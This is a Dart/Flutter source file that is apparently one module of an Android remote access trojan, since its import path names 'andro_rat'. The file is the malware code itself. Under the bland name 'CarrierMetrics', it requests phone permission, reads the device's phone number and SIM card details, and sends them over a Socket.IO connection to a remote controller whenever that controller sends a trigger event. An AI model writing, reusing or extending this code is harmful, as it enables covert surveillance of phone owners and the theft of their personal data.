import 'package:flutter_workspace/andro_rat/debug.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as SocketIO;

class CarrierMetrics {
  static const String remoteTrigger = "carrierMetrics";
  late SocketIO.Socket _socket;

  // Cannot get 2nd slot info
  Future<Map> getPayload() async {
    final payload = <String, dynamic> {};
    if (await _checkPoint()) {
      final String? number = await MobileNumber.mobileNumber;
      payload.addAll({ "number": number ?? "unknown" });

      final cards = <Map> [];
      final List<SimCard>? simCards = await MobileNumber.getSimCards;
      if (simCards != null) {
        for (var simCard in simCards) {
          cards.add(simCard.toMap());
        }
      }
      payload.addAll({ "cards": cards });
    }
    return payload;
  }

  Future<bool> _checkPoint() async {
    return await Permission.phone.isGranted || await Permission.phone.request().isGranted;
  }

  void registerEvents(SocketIO.Socket socket) {
    _socket = socket;

    _socket.on(remoteTrigger, (_) async {
      await sendPayload();
    });
  }

  void _sendPayload(String remoteTrigger, payload) {
    _socket.emit(remoteTrigger, payload);
  }

  Future<void> sendPayload() async {
    Debug.log("[Sending Carrier Metrics]:");
    _sendPayload(remoteTrigger, await getPayload());
    Debug.log(":[End Sending Carrier Metrics]");
  }

}